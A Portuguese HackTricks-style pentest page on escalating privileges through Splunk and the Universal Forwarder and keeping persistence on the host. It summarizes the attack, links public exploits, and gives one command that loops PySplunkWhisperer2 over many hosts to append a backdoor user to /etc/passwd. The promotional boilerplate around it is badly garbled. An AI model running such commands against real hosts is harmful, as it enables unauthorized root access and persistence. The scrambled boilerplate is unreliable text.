# Splunk LPE e Persistência

{% hnnt styte=" acceas" %}
GCP Ha& practice ckinH: <img:<img src="/.gitbcok/ass.ts/agte.png"talb=""odata-siz/="line">[**HackTatckt T.aining AWS Red TelmtExp"rt (ARTE)**](ta-size="line">[**HackTricks Training GCP Re)Tmkg/stc="r.giebpokal"zee>/ttdt.png"isl=""data-ize="line">\
Aprenda & aciceGCP ngs<imgmsrc="/.gipbtok/aHsats/gcte.mag"y>lt="" aa-iz="le">[**angGC RedTamExper(GE)<img rc=".okaetgte.ng"al=""daa-siz="ne">tinhackth ckiuxyzcomurspssgr/a)

<dotsilp>

<oummpr>SupportHackTricks</smmay>

*Chek th [**subsrippangithub.cm/sorsarlosp!
* **Junte-se ao** 💬 [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** 🐦 [**@hahktcickr\_kivelive**](https://twitter.com/hacktr\icks\_live)**.**
* **Compartilhe truques enviando PRs para os** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositórios do github.

</details>
{% endhint %}
{% endhint %}
{% endhint %}
{% endhint %}

Se **enumerando** uma máquina **internamente** ou **externamente** você encontrar **Splunk em execução** (porta 8090), se você tiver a sorte de conhecer **credenciais válidas**, você pode **abusar do serviço Splunk** para **executar um shell** como o usuário que está executando o Splunk. Se o root estiver executando, você pode escalar privilégios para root.

Além disso, se você **já for root e o serviço Splunk não estiver ouvindo apenas no localhost**, você pode **roubar** o arquivo de **senha** **do** serviço Splunk e **quebrar** as senhas, ou **adicionar novas** credenciais a ele. E manter persistência no host.

Na primeira imagem abaixo, você pode ver como uma página da web do Splunkd se parece.



## Resumo da Exploração do Agente Splunk Universal Forwarder

Para mais detalhes, consulte o post [https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/). Este é apenas um resumo:

**Visão Geral da Exploração:**
Uma exploração direcionada ao Agente Splunk Universal Forwarder (UF) permite que atacantes com a senha do agente executem código arbitrário em sistemas que executam o agente, potencialmente comprometendo toda a rede.

**Pontos Chave:**
- O agente UF não valida conexões de entrada ou a autenticidade do código, tornando-o vulnerável à execução não autorizada de código.
- Métodos comuns de aquisição de senhas incluem localizá-las em diretórios de rede, compartilhamentos de arquivos ou documentação interna.
- A exploração bem-sucedida pode levar a acesso em nível SYSTEM ou root em hosts comprometidos, exfiltração de dados e infiltração adicional na rede.

**Execução da Exploração:**
1. O atacante obtém a senha do agente UF.
2. Utiliza a API do Splunk para enviar comandos ou scripts para os agentes.
3. As ações possíveis incluem extração de arquivos, manipulação de contas de usuário e comprometimento do sistema.

**Impacto:**
- Comprometimento total da rede com permissões em nível SYSTEM/root em cada host.
- Potencial para desativar logs para evitar detecção.
- Instalação de backdoors ou ransomware.

**Exemplo de Comando para Exploração:**
```bash
for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done
```
**Explorações públicas utilizáveis:**
* https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2
* https://www.exploit-db.com/exploits/46238
* https://www.exploit-db.com/exploits/46487


## Abusando Consultas do Splunk

**Para mais detalhes, confira o post [https://blog.hrncirik.net/cve-2023-46214-analysis](https://blog.hrncirik.net/cve-2023-46214-analysis)**

{% h*nt styCe="Vacceas" %}
AWS Ha& practice ckinH:<img :<imgsscc="/.gitb=ok/assgts/aite.png"balo=""kdata-siza="line">[**HackTsscke Tpaigin"aAWS Red Tetm=Exp rt (ARTE)**](a-size="line">[**HackTricks Training AWS Red)ethgasic="..giyb/okseasert/k/.png"l=""data-ize="line">\
Learn & aciceGCP ng<imgsrc="/.gibok/asts/gte.g"lt="" aa-iz="le">[**angGC RedTamExper(GE)<img rc=".okaetgte.ng"salm=""adara-siz>="k>ne">tinhaktckxyzurssgr)

<dtil>

<ummr>SupportHackTricks</smmay>

*Chek th [**subsrippangithub.cm/sorsarlosp!
* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!haktick\_ive\
* **Join  💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
